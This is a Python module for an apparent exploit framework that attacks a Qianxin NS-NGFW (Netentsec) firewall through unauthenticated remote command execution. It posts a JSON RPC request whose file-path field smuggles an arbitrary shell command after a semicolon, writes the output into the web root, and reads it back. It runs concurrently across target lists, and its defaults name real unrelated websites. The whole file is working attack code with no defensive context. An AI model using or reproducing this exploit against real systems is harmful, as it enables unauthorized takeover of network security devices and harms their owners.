import json
import random

from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option
from zerooo.request.httpclient import HttpClient
from zerooo.utils.data import random_ua
from zerooo.utils.util import get_target


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': '奇安信NS-NGFW 网康防火墙 前台RCE',
            'Module': 'exploit/qianxin/ns-ngfw',
            'Product': 'qianxin',
            'Cve': '',
            'Create_date': '20210411',
            'Description': '前台RCE',
            'Authors': '',
            'References': ''
        }

        self.option = {
            'targets': {'Current Setting': 'http://lookdiv.com,https://www.baidu.com', 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'command': {'Current Setting': 'whoami', 'Required': 'yes', 'Description': '系统命令'},
            'limit': {'Current Setting': None, 'Required': 'no', 'Description': '并发限制（默认根据当前系统自动调整）'}
        }

    async def ngfwrce(self, target):
        command = self.get_options('command')
        vuln_url = target + '/directdata/direct/router'
        random_file = ''.join(random.sample(
            ['z', 'y', 'x', 'w', 'v', 'u', 't', 's', 'r', 'q', 'p', 'o', 'n', 'm', 'l', 'k', 'j', 'i', 'h', 'g', 'f',
             'e', 'd', 'c', 'b', 'a'], 5)) + '.txt'
        headers = {'Content-Type': 'application/json', 'User-Agent': random_ua()}
        payload = {"action": "SSLVPN_Resource", "method": "deleteImage",
                   "data": [{"data": [f"/var/www/html/d.txt;{command} >/var/www/html/{random_file}"]}], "type": "rpc",
                   "tid": 17}
        # print(json.dumps(payload))
        await HttpClient().send_request_cgi('POST', url=vuln_url, data=json.dumps(payload), headers=headers)
        res_url = target + '/' + random_file
        resp = await HttpClient().send_request_cgi('GET', url=res_url)
        return resp

    def ngfwrce_callback(self, future):
        resp = future.result()
        if resp:
            if resp['code'] == 200:
                msg = resp['text']
                LOGGER.success(msg)
            else:
                msg = 'The target ' + str(resp['url']) + ' not vuln !'
                LOGGER.info(msg)

    def exploit(self):
        targets = get_target(self.get_options('targets'))
        limit = self.get_options('limit')
        async_run(self.ngfwrce, targets, self.ngfwrce_callback, limit)
        LOGGER.info('exploit complete')

